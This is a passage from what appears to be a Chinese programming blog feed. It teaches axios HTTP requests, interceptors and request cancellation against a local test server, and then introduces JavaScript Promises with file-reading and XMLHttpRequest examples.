class="built_in">console</span>.log(response.status);    <span class="built_in">console</span>.log(response.statusText);    <span class="built_in">console</span>.log(response.headers);    <span class="built_in">console</span>.log(response.config);  &#125;)</span><br></pre></td></tr></table></figure><h1 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h1><p>axios(config): 通用/最本质的发任意类型请求的方式 </p><p>axios(url[, config]): 可以只指定 url 发 get 请求 </p><p>axios.request(config): 等同于 axios(config) </p><p>axios.get(url[, config]): 发 get 请求</p><p>axios.delete(url[, config]): 发 delete 请求 </p><p>axios.post(url[, data, config]): 发 post 请求</p><p>制作按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> &gt;</span>get<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> &gt;</span>post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> &gt;</span>put<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span> &gt;</span>delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">butns[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 发送axios请求</span></span><br><span class="line">            axios(&#123;</span><br><span class="line">               <span class="attr">method</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">               <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/posts&#x27;</span></span><br><span class="line">            &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">请求成功</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;data: Array(1), status: 200, statusText: &#x27;OK&#x27;, headers: &#123;…&#125;, config: &#123;…&#125;, …&#125;</span></span><br><span class="line"><span class="comment">config: &#123;transitional: &#123;…&#125;, transformRequest: Array(1), transformResponse: Array(1), timeout: 0, adapter: ƒ, …&#125;</span></span><br><span class="line"><span class="comment">data: [&#123;…&#125;]</span></span><br><span class="line"><span class="comment">headers: &#123;cache-control: &#x27;no-cache&#x27;, content-length: &#x27;77&#x27;, content-type: &#x27;application/json; charset=utf-8&#x27;, expires: &#x27;-1&#x27;, pragma: &#x27;no-cache&#x27;&#125;</span></span><br><span class="line"><span class="comment">request: XMLHttpRequest &#123;onreadystatechange: null, readyState: 4, timeout: 0, withCredentials: false, upload: XMLHttpRequestUpload, …&#125;</span></span><br><span class="line"><span class="comment">status: 200</span></span><br><span class="line"><span class="comment">statusText: &quot;OK&quot;</span></span><br><span class="line"><span class="comment">[[Prototype]]: Object</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">butns[<span class="number">1</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 发送axios请求</span></span><br><span class="line">            axios(&#123;</span><br><span class="line">               <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">               <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/posts&#x27;</span>,</span><br><span class="line">               <span class="comment">//设置请求体</span></span><br><span class="line">               <span class="attr">data</span>: &#123;</span><br><span class="line">                   <span class="attr">title</span>: <span class="string">&#x27;哈哈哈&#x27;</span>,</span><br><span class="line">                   <span class="attr">author</span>: <span class="string">&#x27;李四&#x27;</span></span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">psot发送成功</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">请求网址: http://localhost:3000/posts</span></span><br><span class="line"><span class="comment">请求方法: POST</span></span><br><span class="line"><span class="comment">状态代码: 201 Created</span></span><br><span class="line"><span class="comment">远程地址: 127.0.0.1:3000</span></span><br><span class="line"><span class="comment">引荐来源网址政策: strict-origin-when-cross-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">butns[<span class="number">2</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 发送axios请求</span></span><br><span class="line">            axios(&#123;</span><br><span class="line">               <span class="attr">method</span>:<span class="string">&#x27;PUT&#x27;</span>,</span><br><span class="line">               <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/posts/3&#x27;</span>,</span><br><span class="line">               <span class="comment">//设置请求体</span></span><br><span class="line">               <span class="attr">data</span>: &#123;</span><br><span class="line">                   <span class="attr">title</span>: <span class="string">&#x27;哈哈哈&#x27;</span>,</span><br><span class="line">                   <span class="attr">author</span>: <span class="string">&#x27;李五&#x27;</span></span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">更新数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">请求网址: http://localhost:3000/posts/3</span></span><br><span class="line"><span class="comment">请求方法: OPTIONS</span></span><br><span class="line"><span class="comment">状态代码: 204 No Content</span></span><br><span class="line"><span class="comment">远程地址: 127.0.0.1:3000</span></span><br><span class="line"><span class="comment">引荐来源网址政策: strict-origin-when-cross-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">butns[<span class="number">3</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 发送axios请求</span></span><br><span class="line">            axios(&#123;</span><br><span class="line">               <span class="attr">method</span>:<span class="string">&#x27;delete&#x27;</span>,</span><br><span class="line">               <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/posts/3&#x27;</span>,</span><br><span class="line">              </span><br><span class="line">            &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除请求成功</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">请求网址: http://localhost:3000/posts/3</span></span><br><span class="line"><span class="comment">请求方法: DELETE</span></span><br><span class="line"><span class="comment">状态代码: 200 OK</span></span><br><span class="line"><span class="comment">远程地址: 127.0.0.1:3000</span></span><br><span class="line"><span class="comment">引荐来源网址政策: strict-origin-when-cross-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">butns[<span class="number">3</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 发送axios请求</span></span><br><span class="line">            axios.request(&#123;</span><br><span class="line">               <span class="attr">method</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">               <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/posts&#x27;</span>,</span><br><span class="line">              </span><br><span class="line">            &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;data: Array(3), status: 200, statusText: &#x27;OK&#x27;, headers: &#123;…&#125;, config: &#123;…&#125;, …&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="创建实例对象"><a href="#创建实例对象" class="headerlink" title="创建实例对象"></a>创建实例对象</h1><p>创建实例对象,在配置对象中可以配置默认对象， 返回的是promise对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建axios实例对象发送请求</span></span><br><span class="line"><span class="keyword">const</span> axiosTest = axios.create(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;https:/api.apiopen.top&#x27;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="string">&#x27;3000&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用实例对象获取请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">axiosTest(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;/getJoke&#x27;</span></span><br><span class="line">&#125;).then(</span><br><span class="line">    <span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><p>在请求或响应被 <code>then</code> 或 <code>catch</code> 处理前拦截它们。</p><h2 id="请求拦截器-amp-amp-响应拦截器"><a href="#请求拦截器-amp-amp-响应拦截器" class="headerlink" title="请求拦截器&amp;&amp;响应拦截器"></a>请求拦截器&amp;&amp;响应拦截器</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加请求拦截器</span></span><br><span class="line">axios.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在发送请求之前做些什么</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;请求成功&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对请求错误做些什么</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;请求失败&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加响应拦截器</span></span><br><span class="line">axios.interceptors.response.use(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对响应数据做点什么</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;响应成功&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对响应错误做点什么</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;响应失败&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">axios(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;http://localhost:3000/posts&#x27;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span></span><br><span class="line">&#125;).then( </span><br><span class="line">    <span class="function"><span class="params">response</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;自定义回调成功&#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;自定义回调失败&#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="取消请求"><a href="#取消请求" class="headerlink" title="取消请求"></a>取消请求</h1><p>配置取消对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cancel=<span class="literal">null</span>;</span><br><span class="line">        butns[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cancel !== <span class="literal">null</span>)&#123;</span><br><span class="line">                cancel()</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 发送axios请求</span></span><br><span class="line">            axios(&#123;</span><br><span class="line">               <span class="attr">method</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">               <span class="attr">url</span>: <span class="string">&#x27;http://localhost:3000/posts&#x27;</span>,</span><br><span class="line">                <span class="comment">// 取消对象</span></span><br><span class="line">               <span class="attr">cancelToken</span>: axios.CancelToken(<span class="function"><span class="keyword">function</span> <span class="title">executor</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// executor 函数接收一个 cancel 函数作为参数</span></span><br><span class="line">                cancel = c;</span><br><span class="line">            &#125;)</span><br><span class="line">           &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">                cancel = <span class="literal">null</span></span><br><span class="line">            &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>调用取消函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取消请求</span></span><br><span class="line">butns[<span class="number">4</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    cancel();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise</title>
      <link href="/2022/03/18/Promise/"/>
      <url>/2022/03/18/Promise/</url>
      
        <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><p>一个 <code>Promise</code> 对象代表一个在这个 promise 被创建出来时不一定已知的值。它让您能够把异步操作最终的成功返回值或者失败原因和相应的处理程序关联起来。 这样使得异步方法可以像同步方法那样返回值：异步方法并不会立即返回最终的值，而是会返回一个 <em>promise</em>，以便在未来某个时候把值交给使用者。</p><p>一个 <code>Promise</code> 会处于以下几种状态之一</p><ul><li><em>待定（pending）</em>: 初始状态，既没有被兑现，也没有被拒绝。</li><li><em>已兑现（fulfilled）</em>: 意味着操作成功完成。</li><li><em>已拒绝（rejected）</em>: 意味着操作失败。</li></ul><p>Promise是ES6引入的异步编程的新解决方案。语法上Promise是一个构造器用来封装异步操作可以获取其成功或者失败的结果</p><p>Promise 构造器函数 Promise(excutor){}</p><p>Promise.prototype.then 方法</p><p>Promise.prototype.catch方法</p><p>示例</p><p>通过resolve和reject来改变p的状态</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="comment">// resolve 成功</span></span><br><span class="line"><span class="comment">// reject 失败</span></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// let data = &#x27;操作文件成功&#x27;</span></span><br><span class="line">        <span class="comment">// resolve(data)</span></span><br><span class="line">        <span class="keyword">let</span> data2 = <span class="string">&#x27;操作文件失败&#x27;</span></span><br><span class="line">        reject(data2)</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125; )</span><br><span class="line"></span><br><span class="line">p.then( <span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);</span><br><span class="line"></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(reason);</span><br><span class="line">&#125; )</span><br></pre></td></tr></table></figure><h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><p>读取某个文件而不使用promise</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取文件 </span></span><br><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs-js&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(fs);</span><br><span class="line">fs.readFile(<span class="string">&#x27;./js/txt.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err) <span class="keyword">throw</span> err </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;data :&gt;&gt; &#x27;</span>, data.toString());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用Promise封装</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs2 = <span class="built_in">require</span>(<span class="string">&#x27;fs-js&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    fs2.readFile(<span class="string">&#x27;./js/txt.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="keyword">throw</span> reject(<span class="string">&#x27;失败&#x27;</span>+err) </span><br><span class="line">        resolve(data.toString());</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">p2.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="封装Ajax"><a href="#封装Ajax" class="headerlink" title="封装Ajax"></a>封装Ajax</h1><p>原始Ajax</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;https://api.apiopen.top/getJoke&#x27;</span>)</span><br><span class="line">xhr.send()</span><br><span class="line"><span class="comment">// 处理结果</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(xhr.response);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(xhr.response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>封装后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">ok, erro</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;https://api.apiopen.top/getJoke&#x27;</span>)</span><br><span class="line">    xhr.send()</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)&#123;</span><br><span class="line">                <span class="comment">// 成功</span></span><br><span class="line">                ok(xhr.response)</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                erro(xhr.response)  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">p2.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123; </span><br><span class="line">    <span 